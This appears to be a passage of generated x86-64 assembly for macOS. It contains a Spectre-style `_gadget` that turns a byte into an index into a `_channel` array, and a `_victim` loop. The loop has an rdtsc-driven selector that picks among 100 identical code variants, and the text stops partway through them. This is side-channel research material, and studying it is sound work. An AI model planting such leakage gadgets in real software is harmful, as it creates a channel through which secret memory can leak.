	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_gadget                         ## -- Begin function gadget
	.p2align	4, 0x90
_gadget:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movsbl	(%rax), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_safe_target                    ## -- Begin function safe_target
	.p2align	4, 0x90
_safe_target:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movl	$42, %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_victim                         ## -- Begin function victim
	.p2align	4, 0x90
_victim:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	pushq	%rbx
	.cfi_offset %rbx, -24
	movq	%rdi, -16(%rbp)
	movl	%esi, -20(%rbp)
	movl	$0, -24(%rbp)
	movl	$1, -28(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_win1_var0
	cmpl	$1, %eax
	je	.Lvictim_win1_var1
	cmpl	$2, %eax
	je	.Lvictim_win1_var2
	cmpl	$3, %eax
	je	.Lvictim_win1_var3
	cmpl	$4, %eax
	je	.Lvictim_win1_var4
	cmpl	$5, %eax
	je	.Lvictim_win1_var5
	cmpl	$6, %eax
	je	.Lvictim_win1_var6
	cmpl	$7, %eax
	je	.Lvictim_win1_var7
	cmpl	$8, %eax
	je	.Lvictim_win1_var8
	cmpl	$9, %eax
	je	.Lvictim_win1_var9
	cmpl	$10, %eax
	je	.Lvictim_win1_var10
	cmpl	$11, %eax
	je	.Lvictim_win1_var11
	cmpl	$12, %eax
	je	.Lvictim_win1_var12
	cmpl	$13, %eax
	je	.Lvictim_win1_var13
	cmpl	$14, %eax
	je	.Lvictim_win1_var14
	cmpl	$15, %eax
	je	.Lvictim_win1_var15
	cmpl	$16, %eax
	je	.Lvictim_win1_var16
	cmpl	$17, %eax
	je	.Lvictim_win1_var17
	cmpl	$18, %eax
	je	.Lvictim_win1_var18
	cmpl	$19, %eax
	je	.Lvictim_win1_var19
	cmpl	$20, %eax
	je	.Lvictim_win1_var20
	cmpl	$21, %eax
	je	.Lvictim_win1_var21
	cmpl	$22, %eax
	je	.Lvictim_win1_var22
	cmpl	$23, %eax
	je	.Lvictim_win1_var23
	cmpl	$24, %eax
	je	.Lvictim_win1_var24
	cmpl	$25, %eax
	je	.Lvictim_win1_var25
	cmpl	$26, %eax
	je	.Lvictim_win1_var26
	cmpl	$27, %eax
	je	.Lvictim_win1_var27
	cmpl	$28, %eax
	je	.Lvictim_win1_var28
	cmpl	$29, %eax
	je	.Lvictim_win1_var29
	cmpl	$30, %eax
	je	.Lvictim_win1_var30
	cmpl	$31, %eax
	je	.Lvictim_win1_var31
	cmpl	$32, %eax
	je	.Lvictim_win1_var32
	cmpl	$33, %eax
	je	.Lvictim_win1_var33
	cmpl	$34, %eax
	je	.Lvictim_win1_var34
	cmpl	$35, %eax
	je	.Lvictim_win1_var35
	cmpl	$36, %eax
	je	.Lvictim_win1_var36
	cmpl	$37, %eax
	je	.Lvictim_win1_var37
	cmpl	$38, %eax
	je	.Lvictim_win1_var38
	cmpl	$39, %eax
	je	.Lvictim_win1_var39
	cmpl	$40, %eax
	je	.Lvictim_win1_var40
	cmpl	$41, %eax
	je	.Lvictim_win1_var41
	cmpl	$42, %eax
	je	.Lvictim_win1_var42
	cmpl	$43, %eax
	je	.Lvictim_win1_var43
	cmpl	$44, %eax
	je	.Lvictim_win1_var44
	cmpl	$45, %eax
	je	.Lvictim_win1_var45
	cmpl	$46, %eax
	je	.Lvictim_win1_var46
	cmpl	$47, %eax
	je	.Lvictim_win1_var47
	cmpl	$48, %eax
	je	.Lvictim_win1_var48
	cmpl	$49, %eax
	je	.Lvictim_win1_var49
	cmpl	$50, %eax
	je	.Lvictim_win1_var50
	cmpl	$51, %eax
	je	.Lvictim_win1_var51
	cmpl	$52, %eax
	je	.Lvictim_win1_var52
	cmpl	$53, %eax
	je	.Lvictim_win1_var53
	cmpl	$54, %eax
	je	.Lvictim_win1_var54
	cmpl	$55, %eax
	je	.Lvictim_win1_var55
	cmpl	$56, %eax
	je	.Lvictim_win1_var56
	cmpl	$57, %eax
	je	.Lvictim_win1_var57
	cmpl	$58, %eax
	je	.Lvictim_win1_var58
	cmpl	$59, %eax
	je	.Lvictim_win1_var59
	cmpl	$60, %eax
	je	.Lvictim_win1_var60
	cmpl	$61, %eax
	je	.Lvictim_win1_var61
	cmpl	$62, %eax
	je	.Lvictim_win1_var62
	cmpl	$63, %eax
	je	.Lvictim_win1_var63
	cmpl	$64, %eax
	je	.Lvictim_win1_var64
	cmpl	$65, %eax
	je	.Lvictim_win1_var65
	cmpl	$66, %eax
	je	.Lvictim_win1_var66
	cmpl	$67, %eax
	je	.Lvictim_win1_var67
	cmpl	$68, %eax
	je	.Lvictim_win1_var68
	cmpl	$69, %eax
	je	.Lvictim_win1_var69
	cmpl	$70, %eax
	je	.Lvictim_win1_var70
	cmpl	$71, %eax
	je	.Lvictim_win1_var71
	cmpl	$72, %eax
	je	.Lvictim_win1_var72
	cmpl	$73, %eax
	je	.Lvictim_win1_var73
	cmpl	$74, %eax
	je	.Lvictim_win1_var74
	cmpl	$75, %eax
	je	.Lvictim_win1_var75
	cmpl	$76, %eax
	je	.Lvictim_win1_var76
	cmpl	$77, %eax
	je	.Lvictim_win1_var77
	cmpl	$78, %eax
	je	.Lvictim_win1_var78
	cmpl	$79, %eax
	je	.Lvictim_win1_var79
	cmpl	$80, %eax
	je	.Lvictim_win1_var80
	cmpl	$81, %eax
	je	.Lvictim_win1_var81
	cmpl	$82, %eax
	je	.Lvictim_win1_var82
	cmpl	$83, %eax
	je	.Lvictim_win1_var83
	cmpl	$84, %eax
	je	.Lvictim_win1_var84
	cmpl	$85, %eax
	je	.Lvictim_win1_var85
	cmpl	$86, %eax
	je	.Lvictim_win1_var86
	cmpl	$87, %eax
	je	.Lvictim_win1_var87
	cmpl	$88, %eax
	je	.Lvictim_win1_var88
	cmpl	$89, %eax
	je	.Lvictim_win1_var89
	cmpl	$90, %eax
	je	.Lvictim_win1_var90
	cmpl	$91, %eax
	je	.Lvictim_win1_var91
	cmpl	$92, %eax
	je	.Lvictim_win1_var92
	cmpl	$93, %eax
	je	.Lvictim_win1_var93
	cmpl	$94, %eax
	je	.Lvictim_win1_var94
	cmpl	$95, %eax
	je	.Lvictim_win1_var95
	cmpl	$96, %eax
	je	.Lvictim_win1_var96
	cmpl	$97, %eax
	je	.Lvictim_win1_var97
	cmpl	$98, %eax
	je	.Lvictim_win1_var98
	cmpl	$99, %eax
	je	.Lvictim_win1_var99
	jmp	.Lvictim_win1_var0
## Variant 0
.Lvictim_win1_var0:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 1
.Lvictim_win1_var1:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 2
.Lvictim_win1_var2:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 3
.Lvictim_win1_var3:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 4
.Lvictim_win1_var4:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 5
.Lvictim_win1_var5:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 6
.Lvictim_win1_var6:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 7
.Lvictim_win1_var7:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 8
.Lvictim_win1_var8:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 9
.Lvictim_win1_var9:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 10
.Lvictim_win1_var10:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 11
.Lvictim_win1_var11:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 12
.Lvictim_win1_var12:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 13
.Lvictim_win1_var13:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 14
.Lvictim_win1_var14:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 15
.Lvictim_win1_var15:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 16
.Lvictim_win1_var16:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 17
.Lvictim_win1_var17:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 18
.Lvictim_win1_var18:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 19
.Lvictim_win1_var19:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 20
.Lvictim_win1_var20:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 21
.Lvictim_win1_var21:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 22
.Lvictim_win1_var22:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 23
.Lvictim_win1_var23:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 24
.Lvictim_win1_var24:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 25
.Lvictim_win1_var25:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 26
.Lvictim_win1_var26:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 27
.Lvictim_win1_var27:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 28
.Lvictim_win1_var28:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 29
.Lvictim_win1_var29:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 30
.Lvictim_win1_var30:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 31
.Lvictim_win1_var31:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 32
.Lvictim_win1_var32:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 33
.Lvictim_win1_var33:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 34
.Lvictim_win1_var34:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 35
.Lvictim_win1_var35:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 36
.Lvictim_win1_var36:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 37
.Lvictim_win1_var37:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 38
.Lvictim_win1_var38:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 39
.Lvictim_win1_var39:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 40
.Lvictim_win1_var40:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 41
.Lvictim_win1_var41:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 42
.Lvictim_win1_var42:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 43
.Lvictim_win1_var43:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 44
.Lvictim_win1_var44:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 45
.Lvictim_win1_var45:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 46
.Lvictim_win1_var46:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 47
.Lvictim_win1_var47:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 48
.Lvictim_win1_var48:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 49
.Lvictim_win1_var49:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 50
.Lvictim_win1_var50:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 51
.Lvictim_win1_var51:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 52
.Lvictim_win1_var52:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 53
.Lvictim_win1_var53:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 54
.Lvictim_win1_var54:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 55
.Lvictim_win1_var55:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 56
.Lvictim_win1_var56:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 57
.Lvictim_win1_var57:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 58
.Lvictim_win1_var58:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 59
.Lvictim_win1_var59:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 60
.Lvictim_win1_var60:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 61
.Lvictim_win1_var61:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 62
.Lvictim_win1_var62:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 63
.Lvictim_win1_var63:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 64
.Lvictim_win1_var64:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 65
.Lvictim_win1_var65:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 66
.Lvictim_win1_var66:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 67
.Lvictim_win1_var67:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 68
.Lvictim_win1_var68:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 69
.Lvictim_win1_var69:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 70
.Lvictim_win1_var70:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 71
.Lvictim_win1_var71:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 72
.Lvictim_win1_var72:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 73
.Lvictim_win1_var73:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 74
.Lvictim_win1_var74:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 75
.Lvictim_win1_var75:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 76
.Lvictim_win1_var76:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 77
.Lvictim_win1_var77:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 78
.Lvictim_win1_var78:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	jmp	.Lvictim_win1_continue
## Variant 79
.Lvictim_win1_var79:
	popq	%rax
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
